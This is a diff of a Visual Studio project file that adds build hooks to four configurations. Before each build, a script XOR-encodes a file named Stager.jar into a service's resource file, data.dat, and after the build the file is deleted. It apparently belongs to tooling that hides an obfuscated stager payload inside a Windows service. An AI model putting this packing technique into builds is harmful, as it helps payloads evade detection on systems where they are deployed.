@@ -98,12 +98,10 @@
       <SubSystem>Console</SubSystem>
     </Link>
     <PreBuildEvent>
-      <Command>
-      </Command>
+      <Command>python.exe ..\..\util\script\rolling_xor.py  ..\..\Stager.jar  ..\..\Service\resource\data.dat</Command>
     </PreBuildEvent>
     <PostBuildEvent>
-      <Command>
-      </Command>
+      <Command>del  ..\resource\data.dat</Command>
     </PostBuildEvent>
     <ResourceCompile>
       <AdditionalIncludeDirectories>..\resource;..\include</AdditionalIncludeDirectories>
@@ -123,12 +121,10 @@
       <EnableUAC>false</EnableUAC>
     </Link>
     <PreBuildEvent>
-      <Command>
-      </Command>
+      <Command>python.exe ..\..\util\script\rolling_xor.py  ..\..\Stager.jar  ..\..\Service\resource\data.dat</Command>
     </PreBuildEvent>
     <PostBuildEvent>
-      <Command>
-      </Command>
+      <Command>del  ..\resource\data.dat</Command>
     </PostBuildEvent>
     <ResourceCompile>
       <AdditionalIncludeDirectories>..\resource;..\include</AdditionalIncludeDirectories>
@@ -152,12 +148,10 @@
       <ManifestFile />
     </Link>
     <PreBuildEvent>
-      <Command>
-      </Command>
+      <Command>python.exe ..\..\util\script\rolling_xor.py  ..\..\Stager.jar  ..\..\Service\resource\data.dat</Command>
     </PreBuildEvent>
     <PostBuildEvent>
-      <Command>
-      </Command>
+      <Command>del  ..\resource\data.dat</Command>
     </PostBuildEvent>
     <ResourceCompile>
       <AdditionalIncludeDirectories>..\resource;..\include</AdditionalIncludeDirectories>
@@ -185,12 +179,10 @@
       <ProgramDatabaseFile />
     </Link>
     <PreBuildEvent>
-      <Command>
-      </Command>
+      <Command>python.exe ..\..\util\script\rolling_xor.py  ..\..\Stager.jar  ..\..\Service\resource\data.dat</Command>
     </PreBuildEvent>
     <PostBuildEvent>
-      <Command>
-      </Command>
+      <Command>del  ..\resource\data.dat</Command>
     </PostBuildEvent>
     <ResourceCompile>
       <AdditionalIncludeDirectories>..\resource;..\include</AdditionalIncludeDirectories>
